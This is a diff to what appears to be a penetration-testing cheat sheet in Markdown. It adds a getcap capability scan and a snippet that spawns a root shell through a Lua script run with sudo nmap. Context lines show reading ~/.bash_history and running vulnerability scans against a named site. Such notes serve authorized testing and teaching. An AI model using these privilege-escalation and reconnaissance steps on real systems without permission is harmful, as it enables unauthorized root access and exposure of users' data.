@@ -22,7 +22,15 @@ Finding server strings from a file of URLs
 curl -s --head -K servers.txt | grep -i server
 ```
 
-## Enumerating User Files for Interesting Information
+## Enumerating File Capabilities with Getcap:
+
+getcap displays the name and capabilities of each specified file. ```-r```  enables recursive search.
+
+```
+getcap -r / 2>/dev/null
+```
+
+## Enumerating User Files for Interesting Information:
 
 ```
 cat ~/.bash_history
@@ -210,6 +218,17 @@ Usage:
 ```
 nmap -sV --script=vulscan/vulscan.nse www.rosesecurity.com
 ```
+
+## Nmap Privilege Escalation:
+
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+```bash
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+sudo nmap --script=$TF
+```
+
 ## Nmap Using Multiple Scripts on One Target:
 
 Usage:
